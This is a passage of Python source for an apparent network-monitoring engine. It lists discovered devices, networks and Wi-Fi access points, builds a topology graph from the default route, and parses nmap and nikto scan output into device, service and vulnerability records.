        }

    # ── Network Data Access (tamagotchi is the sole engine) ─────

    def get_devices(self) -> List[Dict[str, Any]]:
        return [d.to_dict() if hasattr(d, 'to_dict') else d for d in self._devices.values()]

    def get_device(self, ip: str) -> Optional[Dict[str, Any]]:
        dev = self._devices.get(ip)
        if dev and hasattr(dev, 'to_dict'):
            return dev.to_dict()
        return dev

    def get_networks(self) -> List[Dict[str, Any]]:
        return [n.to_dict() if hasattr(n, 'to_dict') else n for n in self._networks.values()]

    def get_wifi_aps(self) -> List[Dict[str, Any]]:
        return [a.to_dict() if hasattr(a, 'to_dict') else a for a in self._wifi_aps.values()]

    def get_topology(self) -> Dict[str, Any]:
        return self._topology

    def get_scan_history(self) -> List[Dict[str, Any]]:
        return self._scan_history

    def get_status(self) -> Dict[str, Any]:
        return {
            "running": self._running,
            "paused": self._paused,
            "state": self._state.value,
            "devices": len(self._devices),
            "networks": len(self._networks),
            "wifi_aps": len(self._wifi_aps),
            "topology_nodes": len(self._topology.get("nodes", [])),
            "topology_edges": len(self._topology.get("edges", [])),
            "last_scan": self._last_full_scan,
            "our_ip": self._our_ip,
        }

    def get_live_events(self, since: float = 0) -> List[Dict[str, Any]]:
        if since == 0:
            return self._live_events[-50:]
        return [e for e in self._live_events if e.get("timestamp", 0) > since]

    def search_devices(self, query: str) -> List[Dict[str, Any]]:
        q = query.lower()
        results = []
        for dev in self._devices.values():
            d = dev.to_dict() if hasattr(dev, 'to_dict') else dev
            searchable = f"{d.get('ip','')} {d.get('hostname','')} {d.get('os_guess','')} " + \
                " ".join(f"{s.get('name','')} {s.get('version','')}" for s in d.get('services', []))
            if q in searchable.lower():
                results.append(d)
        return results

    def _emit_event(self, event_type: str, data: Dict[str, Any]):
        import time as _time
        event = {"type": event_type, "timestamp": _time.time(), "data": data}
        self._live_events.append(event)
        if len(self._live_events) > self._max_live_events:
            self._live_events = self._live_events[-self._max_live_events:]

    def _build_topology(self):
        """Build topology graph from collected device/network/wifi data."""
        from agents.sentient import DeviceType
        nodes = []
        edges = []
        node_ids = set()

        def add_node(nid, **kw):
            if nid not in node_ids:
                nodes.append({"id": nid, **kw})
                node_ids.add(nid)

        def add_edge(src, tgt, **kw):
            edges.append({"source": src, "target": tgt, **kw})

        add_node(f"self_{self._our_ip}", type="self", label="ELIOT",
                 icon="🛡️", ip=self._our_ip, color="#3b82f6", radius=22)

        gw = ""
        try:
            import subprocess
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "via" in line:
                    gw = line.split("via")[1].split()[0]
                    break
        except Exception:
            pass

        if gw:
            add_node(f"router_{gw}", type="router", label="Gateway", icon="📡",
                     ip=gw, color="#f59e0b", radius=18)
            add_edge(f"self_{self._our_ip}", f"router_{gw}", type="route")

        icon_map = {
            "router": "📡", "server": "🖥️", "workstation": "💻",
            "mobile": "📱", "iot": "🏠", "printer": "🖨️", "nas": "💾", "unknown": "❓",
        }
        for ip, dev in self._devices.items():
            d = dev.to_dict() if hasattr(dev, 'to_dict') else dev
            dtype = d.get("device_type", "unknown")
            if isinstance(dtype, DeviceType):
                dtype = dtype.value
            nid = f"dev_{ip}"
            add_node(nid, type=dtype, label=d.get("hostname") or ip,
                     icon=icon_map.get(dtype, "❓"), ip=ip,
                     color="#60a5fa", radius=12)
            if gw and ip.startswith(".".join(gw.split(".")[:3])):
                add_edge(nid, f"router_{gw}", type="lan")

        for bssid, ap in self._wifi_aps.items():
            a = ap.to_dict() if hasattr(ap, 'to_dict') else ap
            nid = f"ap_{bssid}"
            add_node(nid, type="wifi_ap", label=a.get("ssid", "?"),
                     icon="📶", ip="", bssid=bssid,
                     signal=a.get("signal", 0), color="#10b981", radius=14)
            add_edge(f"self_{self._our_ip}", nid, type="wifi",
                     label=f"{a.get('signal', 0)}dBm")

        self._topology = {"nodes": nodes, "edges": edges}

    async def ingest_scan_result(self, command: str, stdout: str, source: str = "manual"):
        """Ingest external scan results (from shell agent, manual commands, etc.)."""
        self.log_knowledge("scan_result", f"{source}_{int(time.time())}", {
            "command": command,
            "output_preview": stdout[:2000],
            "source": source,
        }, source=source)

        cmd_lower = command.lower()
        if "nmap" in cmd_lower:
            self._parse_nmap_to_devices(stdout, command)
        if "--script vuln" in cmd_lower or "nikto" in cmd_lower:
            self._parse_vuln_output(stdout, command)

        self.award_xp("scan_informed", detail=f"External: {command[:60]}")

    def _parse_nmap_to_devices(self, stdout: str, command: str = ""):
        from agents.sentient import Device, Service, DeviceType
        import re as _re
        current_ip = ""
        for line in stdout.splitlines():
            m = _re.search(r"Nmap scan report for (\S+?)(?:\s+\((\d+\.\d+\.\d+\.\d+)\))?", line)
            if m:
                hostname = m.group(1)
                ip = m.group(2) or hostname
                if not _re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                    ip = hostname
                current_ip = ip
                if ip not in self._devices:
                    self._devices[ip] = Device(ip=ip, hostname=hostname)
                continue
            if current_ip and ("/tcp" in line or "/udp" in line) and "open" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split("/")
                    port = int(port_proto[0])
                    proto = port_proto[1] if len(port_proto) > 1 else "tcp"
                    name = parts[2]
                    version = " ".join(parts[3:]) if len(parts) > 3 else ""
                    svc = Service(port=port, protocol=proto, name=name, version=version)
                    dev = self._devices[current_ip]
                    existing_ports = {s.port for s in dev.services}
                    if port not in existing_ports:
                        dev.services.append(svc)

    def _parse_vuln_output(self, stdout: str, command: str = ""):
        for line in stdout.splitlines():
            if any(kw in line.lower() for kw in ["vuln", "vulnerability", "cve-", "critical", "high"]):
                self.log_knowledge("vuln_finding", f"ext_{int(time.time())}", {
                    "line": line.strip(),
                    "source": command,
                }, source="external_scan")


# ── Singleton ────────────────────────────────────────────────

_tamagotchi_engine: Optional[TamagotchiEngine] = None


def get_tamagotchi_engine() -> TamagotchiEngine:
    global _tamagotchi_engine
    if _tamagotchi_engine is None:
        _tamagotchi_engine = TamagotchiEngine()
    return _tamagotchi_engine
